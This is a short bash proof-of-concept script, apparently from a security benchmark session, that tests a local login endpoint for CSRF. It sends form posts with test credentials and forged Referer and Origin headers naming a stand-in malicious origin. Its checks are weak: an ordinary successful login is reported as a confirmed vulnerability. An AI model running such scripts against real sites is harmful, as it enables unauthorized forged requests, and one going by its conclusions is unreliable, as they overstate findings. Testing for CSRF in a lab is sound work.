#!/bin/bash
# POC: Tests CSRF vulnerability on login endpoint by attempting POST requests with cross-origin Referer and Origin headers
# Target: ./repo
# Created: 2025-11-07T19:11:50.975Z
# Session: benchmark-XBEN-063-24-mhp81tzn

# CSRF Vulnerability POC for Login Endpoint - Version 2
# Demonstrates that the /login endpoint accepts POST requests from arbitrary origins
# without CSRF token validation or proper origin checking

TARGET_URL="${1:-http://localhost/login}"
EVIL_ORIGIN="${2:-http://evil.com}"

echo "[*] CSRF Vulnerability Test on Login Endpoint"
echo "[*] Target: $TARGET_URL"
echo "[*] Malicious Origin: $EVIL_ORIGIN"
echo ""

# First, test basic login functionality to verify endpoint is accessible
echo "[*] Step 1: Testing basic login with valid credentials..."
response=$(curl -s -i -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

echo "$response"
echo ""

# Extract HTTP status code
http_code=$(echo "$response" | head -n 1)
echo "[*] Response Status: $http_code"
echo ""

# Check if response indicates successful login (302 redirect or contains session cookie)
if echo "$response" | grep -qE "(Set-Cookie|302|Location)"; then
    echo "[+] VULNERABILITY CONFIRMED: Login request succeeded!"
    echo "[+] The endpoint accepted login without CSRF protection"
    echo ""
    echo "[*] Step 2: Testing with cross-origin Referer header (CSRF simulation)..."
    
    # Now test with malicious referer to confirm CSRF vulnerability
    response2=$(curl -s -i -X POST "$TARGET_URL" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Referer: ${EVIL_ORIGIN}/" \
      -H "Origin: ${EVIL_ORIGIN}" \
      -d "username=test&password=test")
    
    echo "$response2"
    echo ""
    
    # Check if cross-origin request also succeeds
    if echo "$response2" | grep -qE "(Set-Cookie|302|Location)"; then
        echo "[+] CSRF VULNERABILITY CONFIRMED!"
        echo "[+] Cross-origin login request succeeded (Referer: ${EVIL_ORIGIN})"
        echo "[+] No CSRF token validation detected"
        echo "[+] No origin validation detected"
        exit 0
    fi
fi

echo "[-] Could not confirm CSRF vulnerability or login failed"
exit 1